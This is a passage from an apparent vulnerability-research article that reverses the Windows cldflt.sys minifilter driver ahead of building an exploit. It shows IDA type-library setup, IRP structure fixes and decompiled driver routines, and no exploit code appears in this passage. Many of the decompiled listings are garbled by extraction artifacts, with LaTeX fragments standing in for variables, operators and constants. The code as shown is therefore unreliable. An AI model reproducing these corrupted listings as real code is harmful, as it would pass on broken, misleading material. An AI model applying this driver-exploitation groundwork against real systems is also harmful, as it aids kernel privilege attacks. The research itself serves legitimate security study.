Almost all default options are good enough. Include directories should have C:\\Program Files (x86)\\Windows Kits\\10\\Include<sdk\_version>, where  must be replaced by one of available Windows SDK versions. The compiler should search for all subdirectories, but I have found rare and strange cases where it didn’t occur, and I needed adding other subdirectories manually (separated by semicolon):

# [https://exploitreversing.com](https://exploitreversing.com/)

C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.26100.0\\shared;

C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.26100.0\\um;

C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.26100.0\\km;

▪ As arguments, I have been using the following combination:

-target x86\_64-pc-win32 -x c++ -D\_ALLOW\_COMPILER\_AND\_STL\_VERSION\_MISMATCH D\_WINDOWS\_IGNORE\_PACKING\_MISMATCH

▪ The options -D\_ALLOW\_COMPILER\_AND\_STL\_VERSION\_MISMATCH - DWINDOWS\_IGNORE\_PACKING\_MISMATCH prevent consistency check between the ${ \\mathsf { C } } { \\mathsf { + } } { \\mathsf { + } }$ compiler and STL headers, and suppress errors associated with structure packing, respectively.

Once these options are setup, we can go to File \| Load File \| Parse C header file and pickup the header file produced by tools like resym and pdbex tools like our flt\_instance.h.

Alternatively, we can find different header files in the Windows SDK directory like ntifs.h (km\\ntifs.h) and other ones that are available on the Internet. However, the task of importing them can be really challenging and time consuming because it is necessary to include all structures and type dependencies and still manage SAL (Source Code Annotation Language) issues.

For this article, I created two working headers which make possible to import the content of ntifs.h file, whose original content has over 25.000 lines:

▪ ida\_nttypes\_final.h (contains all structures, type, and SAL dependencies) ▪ ntifs\_final.h (contains a slightly modified version of the original ntifs.h file)

A short view of ida\_nttypes\_final.h file is shown below:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/0c7bf5478372318d80d7f942dcaf737d1d53af450453111fd2b11816c3efa66e.jpg)

\[Figure 58\]: Few lines of ida\_nttypes\_final.h file

Obviously, there can be a few imprecisions in my approach, but it was enough to get the full ntifs\_final.h parsed correctly without any error. Eventually, I will make these files available on my GitHub account.

Once we have the necessary header files with all resolved dependencies, it is easier to parse and convert them into a custom type-library. To do it we need:

Install latest Windows 11 SDK.

Visual Studio 2022 with ${ \\mathsf { C } } { \\mathsf { + } } { \\mathsf { + } }$ Clang tools for Windows option (and idaclang.exe should be added to the PATH environment variable).

A dedicated folder containing ntifs\_final.h, ida\_nttypes\_final and the original ntifs.h files. tillib64.exe (from IDA SDK) that must be copied to IDA installation path (C:\\Program Files\\IDA Pro 8.4, for example).

Once everything is configured, execute the following command from IDA installation path:

C:\\Program Files\\IDA Pro 8.4> idaclang.exe -target x86\_64-pc-win32 -x c++ - I"C:\\ida\_headers" --idaclang-tildesc "NTIFS.h SDK Header File" --idaclang-tilname "nitifs\_win.til" C:\\ida\_headers\\ntifs\_final.h

In this case both debugger options -D\_ALLOW\_COMPILER\_AND\_STL\_VERSION\_MISMATCH - D\_WINDOWS\_IGNORE\_PACKING\_MISMATCH were not used but it is recommended to keep them around just in case you need them. The ntifs\_win.til file has been generated, and its content is presented below:

C:\\Program Files\\IDA Pro 8.4> tilib64.exe -l ntifs\_win.til \| head -25

TYPE INFORMATION LIBRARY CONTENTS

Description: NTIFS.h SDK Header File

Flags : 0103 compressed macro\_table\_present sizeof\_long\_double

Base tils :

Compiler : Visual ${ \\mathsf { C } } { \\mathsf { + + } }$

sizeof(near\*) $= ~ 8$ sizeo $\\varepsilon ( \\mathbf { \\varepsilon } \_ { \\mathsf { f a r } ^ { \\star } } ) ~ = ~ 8$ near code, near data, cdecl

default\_align $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$ sizeof(bool) $\ c = ~ 1$ sizeof(long) $= 4$ sizeof(llong) = 8

sizeof(enum) $=$ 4 sizeof(int) = 4 sizeof(short) $=$ 2

sizeof(long double) $=$ 8

SYMBOLS

FFFFFFFF 00000000 bool \_\_cdecl ??8\_YA\_NAEBU\_GUID\_\_0\_Z(const GUID \*guidOne, const GUID \*guidOther);

FFFFFFFF 00000000 bool \_\_cdecl ??9\_YA\_NAEBU\_GUID\_\_0\_Z(const GUID \*guidOne, const GUID \*guidOther);

FFFFFFFF 00000000 int \_\_cdecl ?InlineIsEqualGUID\_\_YAHAEBU\_GUID\_\_0\_Z(const GUID \*rguid1, const GUID \*rguid2);

FFFFFFFF 00000000 int \_\_cdecl ?IsEqualGUID\_\_YAHAEBU\_GUID\_\_0\_Z(const GUID \*rguid1, const GUID \*rguid2);

FFFFFFFF 00000000 void $^ { \\star }$ \_\_cdecl ?memchr\_\_YAPEAXPEAXH\_K\_Z(void $\\star \_ { \\mathsf { P v } }$ , int \_C, size\_t \_N);

FFFFFFFF 00000000 char \*\_\_cdecl ?strchr\_\_YAPEADQEADH\_Z(char \*const \_String, const int \_Ch);

FFFFFFFF 00000000 char \*\_\_cdecl ?strpbrk\_\_YAPEADQEADQEBD\_Z(char \*const \_String, const char \*const \_Control);

FFFFFFFF 00000000 char \*\_\_cdecl ?strrchr\_\_YAPEADQEADH\_Z(char \*const \_String, const int \_Ch);

FFFFFFFF 00000000 char \*\_\_cdecl ?strstr\_\_YAPEADQEADQEBD\_Z(char \*const \_String, const char \*const \_SubString);

FFFFFFFF 00000000 \_\_int16 $\\star$ \_\_cdecl ?wcschr\_\_YAPEA\_WPEA\_W\_W\_Z(\_\_int16 \*\_String, \_\_int16 \_C);

[https://exploitreversing.com](https://exploitreversing.com/)

FFFFFFFF 00000000 \_int16 $\\star$ \_\_cdecl ?wcspbrk\_\_YAPEA\_WPEA\_WPEB\_W\_Z(\_\_int16 \*\_String, const \_\_int16 \*\_Control);

FFFFFFFF 00000000 \_\_int16 \*\_\_cdecl ?wcsrchr\_\_YAPEA\_WPEA\_W\_W\_Z(\_\_int16 \*\_String, \_int16 \_C);

FFFFFFFF 00000000 \_int16 $\\star$ \_\_cdecl ?wcsstr\_\_YAPEA\_WPEA\_WPEB\_W\_Z(\_\_int16 \*\_String, const \_\_int16 \*\_SubStr);

Copy the resulting ntifs\_win.til file to til\\pc subfolder in the IDA Pro installation path , go to View \| Open subviews \| Type libraries (SHIFT+F11), press insert and pick the ntifs\_win library:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/dc2dd9915f786ea24a0a2a620a222300546ffa90350bca9f5954cd8b418af895.jpg)

\[Figure 59\]: ntifs\_win.til file

\[Figure 60\]: Add the generated ntifs\_win type-library

To be honest, adding a type-library is an alternative method, but if you need to analyze other kernel drivers and mini-filter drivers such this one, it is worth it and saves time.

As a last example that shows how these simple techniques can be valuable, readers can refer to HsmFileCacheInitialize routine (Figure 39), where there are four dispatch routines that are associated with IRP operations such as reading, writing, querying information and closing, and for all remaining possible operations, the HsmiFileCacheIrpNotImplemented routine is associated. Thus, the respective routines that we could analyze are:

▪ HsmiFileCacheIrpRead ▪ HsmiFileCacheIrpWrite ▪ HsmiFileCacheIrpQueryInformation ▪ HsmiFileCacheIrpClose

Checking the beginning of HsmiFileCacheIrpQueryInformation callback, we find something like:

\_int64 \_\_fastcall HsmiFileCacheIrpQueryInformation(\_\_int64 DeviceObject, \_IRP \*Irp) {

// \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\]

Instance $=$ Irp->Tail.Overlay.ListEntry.Instance;

$\\lor \\bot 4 = \\odot \\bot L$ ;

$\\vee 4 = ~ \\ast$ (\_QWORD $\\star$ )Instance->Base.UniqueIdentifier.Data4;

Volume $=$ (int)Instance->Base.PrimaryLink.Volume;

Count $=$ Instance->Base.RundownRef.Count;

if ( WPP\_GLOBAL\_Control ! $=$ (PDEVICE\_OBJECT)&WPP\_GLOBAL\_Control && (HIDWORD(WPP\_GLOBAL\_Control->Timer) & 8) $\\downarrow = ~ \\odot$ && BYTE1(WPP\_GLOBAL\_Control->Timer) $> =$ 5u )

{ $\\vee 1 3 = \ \\star$ (PFILE\_OBJECT $\\star$ )Instance->Base.UniqueIdentifier.Data4; HIDWORD(v12) $=$ HIDWORD(Irp); WPP\_SF\_qqqlD((\_\_int64)WPP\_GLOBAL\_Control->AttachedDevice);

}

$\\vee 7 \\quad =$ HsmiFileCacheValidateFileObject(v4, 0LL, &v14);

HsmDbgBreakOnStatus(v7);

if ( $\\setminus { 7 \\mathrm { ~ \\Omega ~ } } > = \\mathrm { ~ \\Omega ~ } \\Theta$ )

{ if ( Volume $= \ 5$ ) { if ( Count == $\\Theta \\times \\bot 8$ ) { MasterIrp $=$ Irp->AssociatedIrp.MasterIrp; $\\lor 9 = \\lor 1 4$ ; $\\star ( \_ Q { \\sf W O R D }$ $\\star$ )&MasterIrp->Type $=$ \*(\_QWORD \*)(v14 + 0x18); v10 = \*(\_MDL \*\*)(v9 + $\\Theta \\times 2 \\Theta$ ); $\\star \\left( \\mathrm { \\small { ~ \\left( ~ \\underline { { ~ } } W O R D \\right)} ~ } \\star \\right.$ &MasterIrp->Flags + 2) = 0; $\\begin{array} { l l l } { \\lor 7 } & { = } & { \\emptyset } \\end{array}$ ; MasterIrp->MdlAddress $=$ v10; MasterIrp->Flags = 1; }

Initially, it could seem was necessary to use shifted pointers (a resource from IDA), and everything would be solved. Eventually, it might not be the case because if we check that line 05, according to IDA, the Tail offset is located at $\\mathtt { 0 } \\mathtt { x } 8 0$ , Overlay at offset $0 { \\times } 0$ (it is union) and ListEntry has offset 0x30.

However, we are analyzing a minifilter driver (cldflt.sys) from Windows 11 22H2 at this section, if you check the Virgilius project ( [https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/\_IRP](https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/_IRP)) you will notice that the Tail’s offset is $0 \\times 7 8$ . Therefore, eventually, the applied IRP structure is not correct to this piece of code, and it is necessary to create an alternative IRP structure representation using the appropriate offsets and readers can do it manually by creating a new type of definition through the Csyntax in Local Types (Shift $+ \\mathsf { F } 1$ ) using one of the shown techniques from previous pages.

After applying the new IRP definition, we have:

\_\_int64 \_\_fastcall HsmiFileCacheIrpQueryInformation(\_\_int64 DeviceObject, \_IRP\_CUSTOM $\\star \ I \\mathsf { r } \\mathsf { p } .$ )

// \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\]

CurrentStackLocation $=$ Irp->Tail.Overlay.CurrentStackLocation; $\\lor \\bot 4 = \\odot \\bot L$ ; FileObject $=$ (\_\_int64)CurrentStackLocation->FileObject; FileInformationClass $=$ CurrentStackLocation>Parameters.QueryFile.FileInformationClass; Length $=$ CurrentStackLocation->Parameters.Read.Length; if ( WPP\_GLOBAL\_Control ! $=$ (PDEVICE\_OBJECT)&WPP\_GLOBAL\_Control && (HIDWORD(WPP\_GLOBAL\_Control->Timer) & 8) ! $\\downarrow = \\textup { \\textsf { O } }$ && BYTE1(WPP\_GLOBAL\_Control->Timer) $> =$ 5u ) { $\\vee 1 3 =$ CurrentStackLocation->FileObject; HIDWORD(v12) $=$ HIDWORD(Irp); WPP\_SF\_qqqlD((\_\_int64)WPP\_GLOBAL\_Control->AttachedDevice); }

$\\vee 7 \\quad =$ HsmiFileCacheValidateFileObject(FileObject, 0LL, &v14);

HsmDbgBreakOnStatus(v7);

if ( $\\setminus { 7 \\mathrm { ~ \\Omega ~ } } > = \\mathrm { ~ \\Omega ~ } \\Theta$ )

{ if ( FileInformationClass $= =$ FileStandardInformation ) { if ( Length $= \\quad \\Theta \\times \\quad \\mathrm { 1 8 }$ ) { MasterIrp $=$ Irp->AssociatedIrp.MasterIrp; $\\lor 9 = \\lor 1 4$ ; \*(\_QWORD \*)&MasterIrp->Type $=$ \*(\_QWORD \*)(v14 + 0x18); v10 = \*(\_MDL \*\*)(v9 + $\\Theta \\times 2 \\Theta$ ); \*((\_WORD \*)&MasterIrp->Flags + 2) = 0; $\\begin{array} { l l l } { \\lor 7 } & { = } & { \\emptyset } \\end{array}$ ; MasterIrp->MdlAddress $=$ v10; MasterIrp->Flags $= ~ 1$ ; }

# \[Figure 62\]: HsmiFileCacheIrpQueryInformation with different IRP structure definition

The code has changed considerably, and I only applied the IRP structure definition provided by Virgilius project, which I named as \_IRP\_CUSTOM structure, and every field name has been applied automatically by IDA. I personally had this kind of issue in other opportunities due to structure changes between Windows releases, and the IRP case here is only one example. My advice is that readers should always pay attention to this detail while reversing and analyzing Microsoft code, but it should be clear that this issue could not occur in your analysis due to multiple factors such as previously imported structures or even the IDA Pro version being used.

It is time to return to our analysis because we have a really long path ahead before developing an exploit.

# 11\. Reversing \| part 02 \| WIN10 22H2

Returning to the technical explanation, in this section I will do the same reversing analysis from section 09, but without repeating the explanation. Additionally, our reversing and development ahead will be done using Windows 10 22H2, but it could have been done using Windows 11 23H2 and 22H2. Of course, I could have done all comments based on this section only, but I would lose a good opportunity to show this initial reversed code for both versions, which as extremely similar to each other, and we also should remember that the vulnerability is present in both versions and releases (Win11 23H2, Win11 22H2, Win10 22H2 and Win10 21H2) and also, in the current days, readers will be analyzing Windows 11 versions (24H2 or even newer ones). The important thing is that, at the end, the exploit will work on all of them.

v33 $=$ HIDWORD(CldFltRegistration); \*(\_QWORD $\\star$ )&ValueName.Length $=$ 0x120010LL; changeStamp $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; ValueName.Buffer $=$ L"Altitude"; Handle $= ~ \\odot \\lfloor ~ \\lfloor ~$ ; ObjectName.Buffer $=$ L"\\Registry\\Machine\\System\\WCOSJunctions"; $\\star$ (&ObjectAttributes.Length $+ \\quad 1 ) \\quad = \\quad \\Theta$ ; $\\star$ (&ObjectAttributes.Attributes $+ \\quad 1 ) \\quad = \\quad \\Theta$ ; \*(\_QWORD $\\star$ )&ObjectName.Length $=$ 0x4E004CLL; KeyHandle $=$ 0LL; wil\_InitializeFeatureStaging(); InitializeTelemetryAssertsKM(RegistryPath); TlmInitialize(); memset(&::DriverObject, 0, $\\Theta \\times 4 \ C \\Theta$ uLL); $\\star$ (struct\_arr3\_elems $\\star$ )\_Config $=$ \*arr3\_elems; ::DriverObject $=$ DriverObject; CurrentProcess $=$ IoGetCurrentProcess(); p\_CldFltRegistration $=$ (\_CLDFLT\_REGISTRATION\_CONFIG $\\star$ )&::CldFltRegistration; CldFltReg $=$ (\_CLDFLT\_REGISTRATION\_CONFIG $\\star$ )&\_BE; counter $=$ 2LL; do { FilterType $=$ p\_CldFltRegistration->FilterType; CldFltReg->StartType $=$ p\_CldFltRegistration->StartType; DriverImagePath $=$ p\_CldFltRegistration->DriverImagePath; CldFltReg->FilterType $=$ FilterType; DefaultInstanceName $=$ p\_CldFltRegistration->DefaultInstanceName; CldFltReg->DriverImagePath $=$ DriverImagePath; FilterAltitude $=$ p\_CldFltRegistration->FilterAltitude; CldFltReg->DefaultInstanceName $=$ DefaultInstanceName; FilterFlags $=$ p\_CldFltRegistration->FilterFlags; CldFltReg->FilterAltitude $=$ FilterAltitude; InstanceName $=$ p\_CldFltRegistration->InstanceName; CldFltReg->FilterFlags $=$ FilterFlags; InstanceAltitude $=$ p\_CldFltRegistration->InstanceAltitude; p\_CldFltRegistration $=$ (\_CLDFLT\_REGISTRATION\_CONFIG $\\star$ )((char \*)p\_CldFltRegistration + 128); CldFltReg->InstanceName $=$ InstanceName; CldFltReg $=$ (\_CLDFLT\_REGISTRATION\_CONFIG $\\star$ )((char $\\star$ )CldFltReg $^ +$ 128); CldFltReg\[-1\].InstanceFlags $=$ InstanceAltitude; --counter; } while ( counter ); FilterType\_1 $=$ p\_CldFltRegistration->FilterType; CldFltReg->StartType $=$ p\_CldFltRegistration->StartType; DriverImagePath\_1 $=$ p\_CldFltRegistration->DriverImagePath; CldFltReg->FilterType $=$ FilterType\_1; DefaultInstanceName\_1 $=$ p\_CldFltRegistration->DefaultInstanceName; CldFltReg->DriverImagePath $=$ DriverImagePath\_1; FilterAltitude\_1 $=$ p\_CldFltRegistration->FilterAltitude; CldFltReg->DefaultInstanceName $=$ DefaultInstanceName\_1; CldFltReg->FilterAltitude $=$ FilterAltitude\_1; HsmpDbgInitialize(); ObjectAttributes.Length $= ~ \\odot \\times 3 \\odot$ ; ObjectAttributes.ObjectName $=$ &ObjectName; ObjectAttributes.RootDirectory $=$ 0LL;

ObjectAttributes.Attributes $=$ 576; \*(\_OWORD $\\star$ )&ObjectAttributes.SecurityDescriptor $= ~ \\odot \\lfloor ~ \\lfloor ~ $ ; zwopenkey\_status $=$ ZwOpenKey(&KeyHandle, KEY\_READ, &ObjectAttributes); status $=$ zwopenkey\_status; if ( zwopenkey\_status ! $=$ (unsigned int)STATUS\_OBJECT\_NAME\_NOT\_FOUND ) { if ( zwopenkey\_status < 0 ) goto LABEL\_63; ZwClose(KeyHandle); $\\mathsf { f l a g \_ } = \\mathsf { \\Omega } \\odot$ ; goto LABEL\_16; } $\\mathsf { f l a g ~ \\mathrm { ~ = ~ \ 1 ~ } }$ ; status $=$ ExSubscribeWnfStateChange(&Subscription, &WNF\_DEP\_OOBE\_COMPLETE, 1LL, 0LL,

HsmiOOBECompleteWnfCallback, 0LL); HsmDbgBreakOnStatus(status); if.. status $=$ HsmOsCheckIfSetupInProgress(Subscription, (bool $\\star$ )&flag, &changeStamp); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) {

LABEL\_16: qword\_1C0023400 $=$ MEMORY\[ $\\ni \\times$ FFFFF78000000014\]; status $=$ HsmFileCacheInitialize(DriverObject); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { \*(\_QWORD $\\star$ )&Registration.Size $=$ $\\Theta \\times 2 \\odot 3 \\odot 7 \\odot \\lfloor \\lfloor$ ; memset(&Registration.InstanceTeardownStartCallback, 0, 48); Registration.ContextRegistration $\\cdot$ &g\_HsmContextRegistration; Registration.OperationRegistration $\\cdot$ &g\_HsmFltCallbacks; Registration.InstanceSetupCallback $=$

(PFLT\_INSTANCE\_SETUP\_CALLBACK)HsmFltInstanceSetup; Registration.FilterUnloadCallback $=$ (PFLT\_FILTER\_UNLOAD\_CALLBACK)HsmFltUnload; Registration.InstanceQueryTeardownCallback $=$

(PFLT\_INSTANCE\_QUERY\_TEARDOWN\_CALLBACK)HsmFltInstanceQueryTeardown; \*(\_OWORD $\\star$ )&Registration.NormalizeNameComponentExCallback $=$ 0LL; status $=$ HsmpOpenInstancesRegistryKey(&\_BE, &Handle); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { status $=$ ZwSetValueKey(Handle, &ValueName, 0, 1u, Altitude\_0.Buffer,

Altitude\_0.MaximumLength); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { status $=$ FltRegisterFilter(DriverObject, &Registration, &Filter); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { FltUnregisterFilter(Filter); status $=$ ZwSetValueKey(Handle, &ValueName, 0, 1u, Altitude.Buffer, Altitude.MaximumLength); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) {

status $=$ FltRegisterFilter(DriverObject, &Registration, &Filter); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { KeInitializeSpinLock(&SpinLock); ${ \\lor } \\exists \\allowbreak \\emptyset \\bar { 2 } =$ (\_\_int64)&var\_01; var\_01 $=$ (\_\_int64)&var\_01; $\\mathsf { E x }$ InitializePagedLookasideList(&Lookaside\_List\_0, 0LL, 0LL, POOL\_NX\_ALLOCATION, 0x60uLL, 'eSsH', 0); ExInitializePagedLookasideList(&Lookaside\_List\_1, 0LL, 0LL, POOL\_NX\_ALLOCATION, 0xB0uLL, 'cRsH', 0); ExInitializePagedLookasideList(&Lookaside\_List\_2, 0LL, 0LL, POOL\_NX\_ALLOCATION, 0x58uLL, 'cRsH', 0); E $. { \\bigtriangledown }$ InitializePagedLookasideList( (PPAGED\_LOOKASIDE\_LIST)&ListHead, 0LL, 0LL, POOL\_NX\_ALLOCATION, 0x300uLL, 'rOsH', 0); FltInitExtraCreateParameterLookasideList(Filter, &EcpType, 0, 0x10uLL, 'rOsH'); FltInitExtraCreateParameterLookasideList(Filter, &EcpType\_0, 0, 0x58uLL, 'cAsH'); FltInitExtraCreateParameterLookasideList(Filter, &EcpType\_1, 0, 8uLL, 'pOsH'); $\ = \\log \_ { - } 2 = 1$ ; status $=$ ((\_\_int64 (\_\_fastcall \*)(PFLT\_FILTER))FltStartFiltering)(Filter); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { if ( flag && (ExUnsubscribeWnfStateChange(Subscription), Subscription $=$ 0LL, status $=$ ExSubscribeWnfStateChange( &Subscription, &WNF\_DEP\_OOBE\_COMPLETE, 1LL, changeStamp, HsmiOOBECompleteWnfCallback, 1LL), HsmDbgBreakOnStatus(status), status < 0) ) { WPP\_GLOBAL\_CONTROL $=$ WPP\_GLOBAL\_Control; if ( WPP\_GLOBAL\_Control ! $=$ (PDEVICE\_OBJECT)&WPP\_GLOBAL\_Control && (HIDWORD(WPP\_GLOBAL\_Control->Timer) & 1) != 0 && BYTE1(WPP\_GLOBAL\_Control->Timer) ) { $\\vee 2 4 ~ = ~ 1 9$ ; goto LABEL\_62; } } else

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/d1ba9aab2237b23ebddb029739f0eb7f7a5fb9fac3efc8a11d749cdab4ba2572.jpg)

\[Figure 63\]: HsmDriverEntry routine \| Win10 22H2

As you can see, almost nothing has changed, and there are very slight differences here and there. Other routines are also similar to version presented on Windows 11 22H2/23H2, and that is the case of HsmOsCheckIfSetupInProgress and HsmpDbgInitialize routines.

As we learned previously from Windows 11 22H2/23H2, the HsmFltInstanceSetup callback is a wrapper for HsmpCtxCreateInstanceContext routine, and it is assigned to Registration.InstanceSetupCallback structure member is really long and has over 500 lines.

Although I have reversed the entire routine again, it would be a waste of space to show it here because there is not anything really new, and just in case I need some information from there later then I will show a limited piece of code. The array of preoperation and postoperation callbacks is also similar to the presented-on previously for Windows 11 22H2/23H2, but there are subtle differences and apparently more routines (operations) involved may be relevant:

.rdata:00000001C001B000 ; FLT\_OPERATION\_REGISTRATION g\_HsmFltCallbacks

.rdata:00000001C001B000 g\_HsmFltCallbacks FLT\_OPERATION\_REGISTRATION <0FFh, 0, \

.rdata:00000001C001B000 ; DATA XREF: HsmDriverEntry+322↓o

.rdata:00000001C001B000 offset HsmFltPreACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION,\

.rdata:00000001C001B000 offset HsmFltPostACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION,\

.rdata:00000001C001B000 $\ b 0 >$

.rdata:00000001C001B020 FLT\_OPERATION\_REGISTRATION $< 1 2 \\mathsf { h }$ , 0, offset HsmFltPreCLEANUP,\

.rdata:00000001C001B020 offset HsmFltPostCLEANUP, $\ b 0 >$

.rdata:00000001C001B040 FLT\_OPERATION\_REGISTRATION $<$ 0, 0, offset HsmFltPreCREATE, \

.rdata:00000001C001B040 offset HsmFltPostNETWORK\_QUERY\_OPEN, 0>

.rdata:00000001C001B060 FLT\_OPERATION\_REGISTRATION $< 0 \\mathsf { C h }$ , 0, \

.rdata:00000001C001B060 offset HsmFltPreDIRECTORY\_CONTROL, \

.rdata:00000001C001B060 offset HsmFltPostDIRECTORY\_CONTROL, 0>

.rdata:00000001C001B080 FLT\_OPERATION\_REGISTRATION <0F3h, 0, \

.rdata:00000001C001B080 offset HsmFltPreFAST\_IO\_CHECK\_IF\_POSSIBLE,\

.rdata:00000001C001B080 0, 0>

.rdata:00000001C001B0A0 FLT\_OPERATION\_REGISTRATION < 0Dh, 0, \

.rdata:00000001C001B0A0 offset HsmFltPreFILE\_SYSTEM\_CONTROL, \

.rdata:00000001C001B0A0 offset HsmFltPostFILE\_SYSTEM\_CONTROL, 0>

.rdata:00000001C001B0C0 FLT\_OPERATION\_REGISTRATION < 11h, 0, \

.rdata:00000001C001B0C0 offset HsmFltPreLOCK\_CONTROL, \

.rdata:00000001C001B0C0 offset HsmFltPostLOCK\_CONTROL, 0>

.rdata:00000001C001B0E0 FLT\_OPERATION\_REGISTRATION <0F1h, 0, \

.rdata:00000001C001B0E0 offset HsmFltPreMDL\_READ, 0, 0>

.rdata:00000001C001B100 FLT\_OPERATION\_REGISTRATION <0F2h, 0, \

.rdata:00000001C001B100 offset HsmFltPreNETWORK\_QUERY\_OPEN, \

.rdata:00000001C001B100 offset HsmFltPostNETWORK\_QUERY\_OPEN, 0>

.rdata:00000001C001B120 FLT\_OPERATION\_REGISTRATION <0EFh, 0, \

.rdata:00000001C001B120 offset HsmFltPrePREPARE\_MDL\_WRITE, 0, 0>

.rdata:00000001C001B140 FLT\_OPERATION\_REGISTRATION $<$ 3, 0, offset HsmFltPreREAD, \

.rdata:00000001C001B140 offset HsmFltPostACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION,\

.rdata:00000001C001B140 0>

.rdata:00000001C001B160 FLT\_OPERATION\_REGISTRATION < 6, 0, \

.rdata:00000001C001B160 offset HsmFltPreSET\_INFORMATION, \ offset HsmFltPostSET\_INFORMATION, 0>

FLT\_OPERATION\_REGISTRATION $<$ 4, 0, offset HsmFltPreWRITE, \ offset HsmFltPostACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION,\ 0>

FLT\_OPERATION\_REGISTRATION $<$ 5, 0, 0, \ offset HsmFltPostQUERY\_INFORMATION, 0>

FLT\_OPERATION\_REGISTRATION <0F9h, 0, \ offset HsmFltPreQUERY\_OPEN, \ offset HsmFltPostQUERY\_OPEN, 0>

The HsmpDbgInitialize function, which is remarkably similar to Windows 11, follows below:

NTSTATUS HsmpDbgInitialize()

{ NTSTATUS result; // eax result $=$ RtlStringCchPrintfW( \_DEBUG, 0x80uLL, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s\\Debug", \_BE.Buffer); if ( result > $=$ 0 ) { HsmpGetRegDword(\_DEBUG, L"Flags", &dword\_1C0022D90); HsmpGetRegDword(\_DEBUG, L"BreakOnHydration", &dword\_1C0022FC4); return HsmpGetRegDword(\_DEBUG, L"BreakOnOpen", &dword\_1C0022FC8); } return result;

}

We will be quicky reviewing the HsmFileCacheInitialize routine, invoked from HsmDriverEntry routine, it is also similar to the version found on Windows 11. I will be just showing here because practical tests will be done using Windows 10 22H2:

\_int64 \_\_fastcall HsmFileCacheInitialize(PDRIVER\_OBJECT DriverObject)

{ // \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\] DeviceObject $=$ 0LL; if... memset64(DriverObject->MajorFunction, (unsigned \_int64)HsmiFileCacheIrpNotImplemented, $\\Theta \\times$ 1CuLL); DriverObject->FastIoDispatch $=$ 0LL; DriverObject->MajorFunction\[IRP\_MJ\_READ\] $=$ (PDRIVER\_DISPATCH)HsmiFileCacheIrpRead; DriverObject->MajorFunction\[IRP\_MJ\_WRITE\] $=$ (PDRIVER\_DISPATCH)HsmiFileCacheIrpWrite; DriverObject->MajorFunction\[IRP\_MJ\_QUERY\_INFORMATION\] $=$

(PDRIVER\_DISPATCH)HsmiFileCacheIrpQueryInformation; DriverObject->MajorFunction\[IRP\_MJ\_CLOSE\] $=$ (PDRIVER\_DISPATCH)HsmiFileCacheIrpClose; status $=$ IoCreateDevice(DriverObject, 0, 0LL, 8u, $\\Theta \\times 1 \\Theta \\Theta \\cup$ , 0, &DeviceObject); HsmDbgBreakOnStatus(status); if... if ( Device\_Object ) IoDeleteDevice(Device\_Object);

if... return (unsigned int)status; }

We have three callbacks related to file cache operations:

# HsmiFileCacheIrpRead:

Invokes FltAllocateCallbackData function, which allocates a callback data structure that will be used by the minifilter to initialize an I/O request. Call the FltPerformSynchronousIo to initiate a synchronous I/O operation. Call MmMapLockedPagesSpecifyCache function, which maps physical pages described by an MDL to a virtual address and allows the caller to specify a cache attribute (MmCached).

# Status $=$ FltAllocateCallbackData(

struct\_01->Instance, struct\_01->FileObject, &CallbackData); HsmDbgBreakOnStatus(Status); if... CallbackData->Iopb->MajorFunction $=$ IRP\_MJ\_READ; CallbackData->Iopb->MinorFunction $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; CallbackData->Iopb->Parameters.Read.ByteOffset $=$ ByteOffset; CallbackData->Iopb->Parameters.Read.Length $=$ Length; CallbackData->Iopb->Parameters.Read.MdlAddress $=$ irp->MdlAddress; CallbackData->Iopb->Parameters.Read.Key $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; CallbackData->Iopb->Parameters.Read.ReadBuffer $= ~ \\odot \\lfloor ~ \\lfloor ~$ ; CallbackData->Iopb->IrpFlags \| $=$ IRP\_SYNCHRONOUS\_PAGING\_IO\_NO\_CACHE; FltPerformSynchronousIo(CallbackData); CallbackData->Iopb->Parameters.Read.MdlAddress $= ~ \\odot \\lfloor ~ \\lfloor ~$ ; Status $=$ CallbackData->IoStatus.Status; HsmDbgBreakOnStatus(Status); Information $=$ CallbackData->IoStatus.Information; pfunc $=$ (\_\_int64 (\_\_fastcall $\\star$ )(PFILE\_OBJECT, \_QWORD, LARGE\_INTEGER, PVOID, unsigned int))struct\_01->pfunc; if ( pfunc && ((MdlAddress\_1 $=$ irp->MdlAddress, // The MmMapLockedPagesSpecifyCache routine maps the physical pages // that are described by an MDL to a virtual address, and enables // the caller to specify 